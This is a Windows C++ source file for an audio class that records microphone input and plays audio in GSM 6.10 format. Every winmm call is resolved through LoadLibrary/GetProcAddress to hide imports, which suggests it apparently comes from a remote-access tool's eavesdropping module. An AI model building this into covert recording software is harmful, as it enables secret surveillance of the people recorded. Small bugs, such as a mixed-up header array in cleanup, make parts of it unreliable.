// Audio.cpp: implementation of the CAudio class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "Audio.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CAudio::CAudio()
{
	m_hEventWaveIn = CreateEvent(NULL, false, false, NULL);
	m_hStartRecord = CreateEvent(NULL, false, false, NULL);
	m_hThreadCallBack = NULL;
	m_nWaveInIndex = 0;
	m_nWaveOutIndex = 0;
	m_nBufferLength = 1000; // m_GSMWavefmt.wfx.nSamplesPerSec / 8(bit)

	m_bIsWaveInUsed = false;
	m_bIsWaveOutUsed = false;
	m_hWaveIn = NULL;
	m_hWaveOut = NULL;

	for (int i = 0; i < 2; i++)
	{
		m_lpInAudioData[i] = new BYTE[m_nBufferLength];
		m_lpInAudioHdr[i] = new WAVEHDR;

		m_lpOutAudioData[i] = new BYTE[m_nBufferLength];
		m_lpOutAudioHdr[i] = new WAVEHDR;
	}

	memset(&m_GSMWavefmt, 0, sizeof(GSM610WAVEFORMAT));

	m_GSMWavefmt.wfx.wFormatTag = WAVE_FORMAT_GSM610; // ACM will auto convert wave format
	m_GSMWavefmt.wfx.nChannels = 1;
	m_GSMWavefmt.wfx.nSamplesPerSec = 8000;
	m_GSMWavefmt.wfx.nAvgBytesPerSec = 1625;
	m_GSMWavefmt.wfx.nBlockAlign = 65;
	m_GSMWavefmt.wfx.wBitsPerSample = 0;
	m_GSMWavefmt.wfx.cbSize = 2;
	m_GSMWavefmt.wSamplesPerBlock = 320;
}

/*
	HINSTANCE winmm = LoadLibrary(_T("Winmm.dll"));

	typedef MMRESULT (WINAPI *SETSOCK)(HWAVEIN);
	SETSOCK mysetsockopt= (SETSOCK)GetProcAddress(winmm, "setsockopt");

	if(winmm)
	FreeLibrary(winmm);
	*/

CAudio::~CAudio()
{
	HINSTANCE winmm = LoadLibrary(_T("Winmm.dll"));

	typedef MMRESULT(WINAPI *WIS)(HWAVEIN);
	WIS mywaveInStop = (WIS)GetProcAddress(winmm, "waveInStop");

	typedef MMRESULT(WINAPI *WIR)(HWAVEIN);
	WIR mywaveInReset = (WIR)GetProcAddress(winmm, "waveInReset");

	typedef MMRESULT(WINAPI *WIC)(HWAVEIN);
	WIC mywaveInClose = (WIC)GetProcAddress(winmm, "waveInClose");

	typedef MMRESULT(WINAPI *WIH)(HWAVEIN, LPWAVEHDR, UINT);
	WIH mywaveInUnprepareHeader = (WIH)GetProcAddress(winmm, "waveInUnprepareHeader");

	typedef MMRESULT(WINAPI *WOR)(HWAVEOUT);
	WOR mywaveOutReset = (WOR)GetProcAddress(winmm, "waveOutReset");

	typedef MMRESULT(WINAPI *WOC)(HWAVEOUT);
	WOC mywaveOutClose = (WOC)GetProcAddress(winmm, "waveOutClose");

	typedef MMRESULT(WINAPI *WOH)(HWAVEOUT, LPWAVEHDR, UINT);
	WOH mywaveOutUnprepareHeader = (WOH)GetProcAddress(winmm, "waveOutUnprepareHeader");

	if (m_bIsWaveInUsed)
	{
		mywaveInStop(m_hWaveIn);
		mywaveInReset(m_hWaveIn);
		for (int i = 0; i < 2; i++)
			mywaveInUnprepareHeader(m_hWaveIn, m_lpInAudioHdr[i], sizeof(WAVEHDR));
		mywaveInClose(m_hWaveIn);
		TerminateThread(m_hThreadCallBack, -1);
	}

	if (m_bIsWaveOutUsed)
	{
		mywaveOutReset(m_hWaveOut);
		for (int i = 0; i < 2; i++)
			mywaveOutUnprepareHeader(m_hWaveOut, m_lpInAudioHdr[i], sizeof(WAVEHDR));
		mywaveOutClose(m_hWaveOut);
	}

	for (int i = 0; i < 2; i++)
	{
		delete[] m_lpInAudioData[i];
		delete m_lpInAudioHdr[i];

		delete[] m_lpOutAudioData[i];
		delete m_lpOutAudioHdr[i];
	}

	CloseHandle(m_hEventWaveIn);
	CloseHandle(m_hStartRecord);
	CloseHandle(m_hThreadCallBack);

	if (winmm)
		FreeLibrary(winmm);
}

LPBYTE CAudio::getRecordBuffer(LPDWORD lpdwBytes)
{
	// Not open WaveIn yet, so open it...
	if (!m_bIsWaveInUsed && !InitializeWaveIn())
		return NULL;

	if (lpdwBytes == NULL)
		return NULL;

	SetEvent(m_hStartRecord);
	WaitForSingleObject(m_hEventWaveIn, INFINITE);
	*lpdwBytes = m_nBufferLength;
	return	m_lpInAudioData[m_nWaveInIndex];
}

bool CAudio::playBuffer(LPBYTE lpWaveBuffer, DWORD dwBytes)
{
	HINSTANCE winmm = LoadLibrary(_T("Winmm.dll"));

	typedef MMRESULT(WINAPI *WOW)(HWAVEOUT, LPWAVEHDR, UINT);
	WOW mywaveOutWrite = (WOW)GetProcAddress(winmm, "waveOutWrite");

	if (!m_bIsWaveOutUsed && !InitializeWaveOut())
		return NULL;

	for (unsigned int i = 0; i < dwBytes; i += m_nBufferLength)
	{
		memcpy(m_lpOutAudioData[m_nWaveOutIndex], lpWaveBuffer, m_nBufferLength);
		mywaveOutWrite(m_hWaveOut, m_lpOutAudioHdr[m_nWaveOutIndex], sizeof(WAVEHDR));
		m_nWaveOutIndex = 1 - m_nWaveOutIndex;
	}
	if (winmm)
		FreeLibrary(winmm);
	return true;
}

bool CAudio::InitializeWaveIn()
{
	HINSTANCE winmm = LoadLibrary(_T("Winmm.dll"));

	typedef MMRESULT(WINAPI *WIST)(HWAVEIN);
	WIST mywaveInStart = (WIST)GetProcAddress(winmm, "waveInStart");

	typedef UINT(WINAPI *WIND)(void);
	WIND mywaveInGetNumDevs = (WIND)GetProcAddress(winmm, "waveInGetNumDevs");

	typedef MMRESULT(WINAPI *WIO)(LPHWAVEIN, UINT, LPCWAVEFORMATEX, DWORD_PTR, IN DWORD_PTR, IN DWORD);
	WIO mywaveInOpen = (WIO)GetProcAddress(winmm, "waveInOpen");

	typedef MMRESULT(WINAPI *WIPH)(HWAVEIN, LPWAVEHDR, UINT);
	WIPH mywaveInPrepareHeader = (WIPH)GetProcAddress(winmm, "waveInPrepareHeader");

	typedef MMRESULT(WINAPI *WIAB)(HWAVEIN, LPWAVEHDR, UINT);
	WIAB mywaveInAddBuffer = (WIAB)GetProcAddress(winmm, "waveInAddBuffer");

	if (!mywaveInGetNumDevs())
		return false;

	MMRESULT	mmResult;
	DWORD		dwThreadID = 0;
	m_hThreadCallBack = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)waveInCallBack, (LPVOID)this, CREATE_SUSPENDED, &dwThreadID);
	mmResult = mywaveInOpen(&m_hWaveIn, (WORD)WAVE_MAPPER, &(m_GSMWavefmt.wfx), (LONG)dwThreadID, (LONG)0, CALLBACK_THREAD);

	if (mmResult != MMSYSERR_NOERROR)
		return false;

	for (int i = 0; i < 2; i++)
	{
		m_lpInAudioHdr[i]->lpData = (LPSTR)m_lpInAudioData[i];
		m_lpInAudioHdr[i]->dwBufferLength = m_nBufferLength;
		m_lpInAudioHdr[i]->dwFlags = 0;
		m_lpInAudioHdr[i]->dwLoops = 0;
		mywaveInPrepareHeader(m_hWaveIn, m_lpInAudioHdr[i], sizeof(WAVEHDR));
	}

	mywaveInAddBuffer(m_hWaveIn, m_lpInAudioHdr[m_nWaveInIndex], sizeof(WAVEHDR));

	ResumeThread(m_hThreadCallBack);
	mywaveInStart(m_hWaveIn);

	m_bIsWaveInUsed = true;

	if (winmm)
		FreeLibrary(winmm);
	return true;
}

bool CAudio::InitializeWaveOut()
{
	HINSTANCE winmm = LoadLibrary(_T("Winmm.dll"));

	typedef UINT(WINAPI *WIND)(void);
	WIND mywaveOutGetNumDevs = (WIND)GetProcAddress(winmm, "waveOutGetNumDevs");

	typedef MMRESULT(WINAPI *WIO)(LPHWAVEOUT, UINT, LPCWAVEFORMATEX, DWORD_PTR, IN DWORD_PTR, IN DWORD);
	WIO mywaveOutOpen = (WIO)GetProcAddress(winmm, "waveOutOpen");

	typedef MMRESULT(WINAPI *WIPH)(HWAVEOUT, LPWAVEHDR, UINT);
	WIPH mywaveOutPrepareHeader = (WIPH)GetProcAddress(winmm, "waveOutPrepareHeader");

	if (!mywaveOutGetNumDevs())
		return false;

	int i;
	for (i = 0; i < 2; i++)
		memset(m_lpOutAudioData[i], 0, m_nBufferLength);

	MMRESULT	mmResult;
	mmResult = mywaveOutOpen(&m_hWaveOut, (WORD)WAVE_MAPPER, &(m_GSMWavefmt.wfx), (LONG)0, (LONG)0, CALLBACK_NULL);
	if (mmResult != MMSYSERR_NOERROR)
		return false;

	for (i = 0; i < 2; i++)
	{
		m_lpOutAudioHdr[i]->lpData = (LPSTR)m_lpOutAudioData[i];
		m_lpOutAudioHdr[i]->dwBufferLength = m_nBufferLength;
		m_lpOutAudioHdr[i]->dwFlags = 0;
		m_lpOutAudioHdr[i]->dwLoops = 0;
		mywaveOutPrepareHeader(m_hWaveOut, m_lpOutAudioHdr[i], sizeof(WAVEHDR));
	}

	m_bIsWaveOutUsed = true;
	if (winmm)
		FreeLibrary(winmm);
	return true;
}

DWORD WINAPI CAudio::waveInCallBack(LPVOID lparam)
{
	CAudio	*pThis = (CAudio *)lparam;

	HINSTANCE winmm = LoadLibrary(_T("Winmm.dll"));

	typedef MMRESULT(WINAPI *WIAB)(HWAVEIN, LPWAVEHDR, UINT);
	WIAB mywaveInAddBuffer = (WIAB)GetProcAddress(winmm, "waveInAddBuffer");

	MSG	Msg;
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		if (Msg.message == MM_WIM_DATA)
		{
			// 通知的数据到来
			SetEvent(pThis->m_hEventWaveIn);
			// 等待开始下次录音
			WaitForSingleObject(pThis->m_hStartRecord, INFINITE);

			pThis->m_nWaveInIndex = 1 - pThis->m_nWaveInIndex;

			MMRESULT mmResult = mywaveInAddBuffer(pThis->m_hWaveIn, pThis->m_lpInAudioHdr[pThis->m_nWaveInIndex], sizeof(WAVEHDR));
			if (mmResult != MMSYSERR_NOERROR)
				return -1;
		}

		// Why never happend this
		if (Msg.message == MM_WIM_CLOSE)
			break;

		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}

	if (winmm)
		FreeLibrary(winmm);

	return 0;
}